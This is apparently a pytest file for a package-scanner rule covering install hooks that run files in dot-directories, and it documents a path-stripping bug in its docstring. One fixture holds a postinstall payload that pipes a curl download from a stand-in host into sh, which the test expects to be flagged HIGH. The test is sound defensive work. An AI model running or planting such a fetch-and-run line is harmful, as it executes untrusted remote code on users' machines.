"""An install hook that runs a file in a dot-directory runs THAT file (`node .scripts/postinstall.js`).

`lstrip("./")` strips characters, not a prefix: `.scripts/postinstall.js` became
`scripts/postinstall.js`, which is not in the package, so the hook read as running something opaque
(HIGH: benign packages blocked in review 98's G6) and the engine resolved the hook to a file that is
not the one it runs. Only a leading `./` is the shell's spelling of "here".
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config import Config
from cordon_scanner.foundation.models import Severity

RULE = "SUSPECT.INSTALL.SCRIPT.001"


class DotPathKit:
    @staticmethod
    def scan(tmp_path: Path, hook: str, files: dict[str, str]):
        manifest = {"name": "p", "version": "1.0.0", "scripts": {"postinstall": hook}}
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for name, text in {"package/package.json": json.dumps(manifest), **files}.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "p-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target).findings


class TestADotDirectoryTarget:
    def test_a_readable_file_in_a_dot_directory_is_the_packages_own_source(
        self, tmp_path: Path
    ) -> None:
        findings = DotPathKit.scan(
            tmp_path,
            "node .scripts/postinstall.js",
            {"package/.scripts/postinstall.js": "console.log('ok');\n"},
        )
        hooks = [f for f in findings if f.rule_id == RULE]
        assert hooks and all(f.severity <= Severity.LOW for f in hooks)

    def test_a_leading_dot_slash_is_still_here(self, tmp_path: Path) -> None:
        findings = DotPathKit.scan(
            tmp_path, "node ./.tests/index.js", {"package/.tests/index.js": "console.log('ok');\n"}
        )
        assert all(f.severity <= Severity.LOW for f in findings if f.rule_id == RULE)

    def test_what_the_file_does_is_judged_as_install_time_code(self, tmp_path: Path) -> None:
        payload = "require('child_process').execSync('curl -s https://example.invalid/a | sh');\n"
        findings = DotPathKit.scan(
            tmp_path, "node .scripts/postinstall.js", {"package/.scripts/postinstall.js": payload}
        )
        assert any(
            f.location.path.endswith(".scripts/postinstall.js") and f.severity >= Severity.HIGH
            for f in findings
        )

    def test_a_file_that_is_not_there_still_reports(self, tmp_path: Path) -> None:
        findings = DotPathKit.scan(
            tmp_path, "node .scripts/missing.js", {"package/index.js": "module.exports = 1;\n"}
        )
        assert any(f.rule_id == RULE and f.severity >= Severity.HIGH for f in findings)
